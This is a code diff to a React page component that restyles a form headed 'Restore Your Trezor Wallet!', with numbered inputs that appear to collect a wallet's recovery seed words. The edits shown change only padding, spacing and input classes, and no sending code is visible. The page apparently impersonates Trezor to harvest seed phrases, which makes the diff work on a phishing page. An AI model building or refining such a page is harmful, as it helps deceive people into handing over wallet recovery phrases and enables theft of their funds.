@@ -99,7 +99,7 @@ export default function Home() {
 
           {/* FORM (HIDDEN WHEN COLLAPSED) */}
           {open && (
-            <div className="px-10 py-8">
+            <div className="px-4 md:px-10">
 
               <h2 className="text-2xl font-semibold text-center mb-2">
                 Restore Your Trezor Wallet!
@@ -133,14 +133,22 @@ export default function Home() {
               </p>
 
               {/* INPUTS */}
-              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-5">
+              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                 {words.map((val, i) => (
                   <input
                     key={i}
                     value={val}
                     onChange={(e) => updateWord(i, e.target.value)}
                     placeholder={`${i + 1}.`}
-                    className="px-4 py-3 border rounded focus:ring-2 focus:ring-green-500 outline-none"
+                     className="
+    w-full
+    px-3 py-2
+    border border-gray-300
+    rounded
+    focus:outline-none
+    focus:ring-2 focus:ring-green-500
+    text-gray-900
+  "
                   />
                 ))}
               </div>
